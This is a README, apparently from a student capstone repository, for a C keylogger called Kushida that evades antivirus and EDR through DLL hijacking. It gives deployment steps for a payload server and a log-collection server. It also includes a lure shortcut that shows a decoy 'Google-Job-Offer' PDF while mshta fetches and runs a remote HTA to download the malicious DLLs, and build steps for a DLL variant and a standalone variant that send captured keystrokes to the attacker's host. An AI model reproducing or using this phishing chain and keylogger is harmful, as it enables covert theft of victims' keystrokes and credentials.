# Kushida
This is the Kushida keylogger developed for my fall 2023 Bachelor's capstone project. It was developed for research and academic purposes.

Kushida is a keylogger written in C. It is a proof of concept for evading modern EDR and AV programs. It successfully evades many EDR solutions by using DLL hijacking.

# Setting up the server

The server should be a Linux server and needs to have Python 3 installed, and the victim needs to have the ability to initiate a TCP connection to the server. The libraries the server uses are part of the Python standard library.

Two services need to be run for this server:
1. The HTTP file service
2. The HTTP log collection service
To run the HTTP file service
1. Download the KeyloggerFiles Folder from the repository
2. Place the KeyloggerFiles folder in your file system (anywhere is fine).
3. Change directories into the KeyloggerFiles folder and run the following command:

```bash
sudo python3 -m http.server 80
```

If you want to background the process, you press CTRL+Z, then type bg. 

Next, to set up the HTTPS log collection service, we need to download the httpsServer folder from the repository.
1. Change directories inside the downloaded the httpsServer folder
2. Generate keys if needed
3. Then, run the Python file inside the folder with:
```bash
python3 httpsServer.py
```
Keys are provided in the repository, however, you can generate your own keys with the following openssl command:
```bash
openssl req -new -x509 -keyout key.pem -out server.pem -days 365 -nodes
```

The services should now be running on all interfaces. The ports that are used are port 80 for the HTTP file server and 8080 for the HTTPS server. These values can be modified if needed, however, you will also need to modify the ports of the malware accordingly.

# Building and running Kushida

## Google-Job-Offer.pdf.lnk
This is the malicious "PDF" which will present a PDF to the user and install Kushida.
Replace the IP address `192.168.12.95` with your server's IP address.
```PowerShell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "& start microsoft-edge:http://192.168.12.95/Google-Job-Offer.pdf; C:\Windows\System32\mshta.exe http://192.168.12.95/FileDownloader.hta"
```

## FileDownloader.hta
This script is downloaded by the lnk
Replace the IP address `192.168.12.95` with your server's IP address.
```javascript
var fileUrl1 = "http://192.168.12.95/cscapi.dll";  
var fileUrl2 = "http://192.168.12.95/libcurl-d.dll"; 
var fileUrl3 = "http://192.168.12.95/zlibd1.dll";
```

## cscapi.dll

This is the keylogger itself. To compile this, we need vcpkg installed.

Installation instructions can be found here: [Get started with vcpkg](https://vcpkg.io/en/getting-started.html)

Then open a command prompt, change directories to the vcpkg directory you installed, and enter the following command:
```
vcpkg.exe install curl[tool]
```

You may need to reload Visual Studio after installing libcurl.

Change the `POST_URL` definition to the URL your server uses. By default, just change the IP address. 
```
#define POST_URL "https://192.168.12.95:8080/file.txt"
```

Now, in Debug 64-bit mode, build the program using Visual Studio. You can also build the program in Release, however, you would have to change the names for `libcurl-d.dll` and `zlibd1.dll` to `libcurl.dll` and `zlib1.dll` respectively. 

If you need to target a 32-bit application, compile the DLL in 32-bit mode.

Now place the programs you have built into the KeyloggerFiles folder on your server.

# Kushida in action

![Pasted image 20231130001641](https://github.com/nszeto168/kushida/assets/103395342/8e7d322b-a74d-461a-9a6a-380653d11625)

The malicious and non-malicious PDFs are nearly identical.


![Pasted image 20231130001719](https://github.com/nszeto168/kushida/assets/103395342/c3e54f42-3513-4713-9fd0-032c603afccf)

The malicious LNK file will open a PDF for the victim, making it seem legitimate.

![Pasted image 20231130002042](https://github.com/nszeto168/kushida/assets/103395342/0b9c52b0-4fd0-4efb-947c-abe7265e651e)

![Pasted image 20231130002120](https://github.com/nszeto168/kushida/assets/103395342/f96268b6-07d4-4d84-aff9-218def0392f4)


The keylogging should start. Whenever Kushida starts up and is loaded into memory, it will execute DLLMain, which will send log.txt to the HTTPS server.
![Pasted image 20231130002157](https://github.com/nszeto168/kushida/assets/103395342/3bf41847-5141-4788-9ce4-33608da8fbfd)


# Kushida Solo (standalone exe)

There is a modified version of Kushida available which functions as a standalone exe file. This exe file can be useful because certain EDRs may be triggered by DLL hijacking or the malicious LNK file. However, the DLL hijacking method tends to be a stealthier solution long term because it makes far less "noise".

There are some benefits to Kushida Solo:
- With Kushida Solo, you do not need `libcurl-.dll` nor `zlibd1.dll`.
- Kushida Solo can be compiled either as a 32-bit or a 64-bit application.
- Kushida Solo may evade some defenses more effectively (generally Kushida as a DLL is better though).

## Building Kushida Solo
![Pasted image 20231130003706](https://github.com/nszeto168/kushida/assets/103395342/db46e388-9724-4d71-b7fe-7e2fcc6d94b1)


Change Kushida's send frequency in keylogger.h. By default, it is every 5 seconds. This makes a lot of noise and is not recommended, however, it is good for testing.

Also, change the hostname definition in keylogger.cpp
![Pasted image 20231130005729](https://github.com/nszeto168/kushida/assets/103395342/545ad103-0dce-44b8-8597-4e7168f99d76)


VisualStudio's build tool does not seem to work when compiling Kushida solo, so we can compile it with cl.exe

Change directories to the `keylogger` directory, then run:
```PowerShell
cl.exe keylogger.cpp /link /OUT:kushida.exe winhttp.lib user32.lib kernel32.lib
```

Now you should have a standalone executable. The executable generates a log file in the same directory as itself.
You will still need to run the HTTPS log collection server, however, you will not need the HTTP file server when using Kushida Solo.

# Results
![image](https://github.com/nszeto168/kushida/assets/103395342/880607eb-b469-408e-bfaf-10a3e30f9f1e)

Thanks for checking out the Kushida keylogger, I hope you enjoyed it!
